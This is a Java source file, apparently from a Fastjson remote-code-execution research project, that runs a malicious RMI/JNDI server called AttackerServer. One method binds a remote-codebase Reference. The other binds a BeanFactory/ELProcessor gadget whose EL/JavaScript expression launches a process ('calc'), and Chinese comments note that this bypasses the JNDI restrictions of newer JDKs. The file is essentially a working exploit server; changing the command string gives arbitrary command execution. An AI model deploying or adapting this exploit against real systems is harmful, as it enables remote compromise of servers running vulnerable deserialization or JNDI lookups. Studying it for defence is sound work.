package com.lyhistory.rce.fastjson.rmi_jndi;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

import org.apache.naming.ResourceRef;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class AttackerServer {
	public static void start() throws AlreadyBoundException, RemoteException, NamingException {
		System.setProperty("java.rmi.server.hostname", "127.0.0.1"); // important for remote deployment
		Registry registry = LocateRegistry.createRegistry(1099);
		Reference reference = new Reference("com.lyhistory.rce.fastjson.Exploit", "com.lyhistory.rce.fastjson.Exploit", "http://127.0.0.1/");
		ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
		registry.bind("Exploit", referenceWrapper);
	}
	
	// https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
	// https://github.com/kxcode/JNDI-Exploit-Bypass-Demo
	public static void bypassHigherJDK_untrustedRmi() throws RemoteException, NamingException, AlreadyBoundException {
		Registry registry = LocateRegistry.createRegistry(1099);
		// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
		ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
		// 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
		ref.add(new StringRefAddr("forceString", "KINGX=eval"));
		// 利用表达式执行命令
		ref.add(new StringRefAddr("KINGX", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

		ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
		registry.bind("Exploit", referenceWrapper);
	}
	public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
		//start();
		bypassHigherJDK_untrustedRmi();
	}
}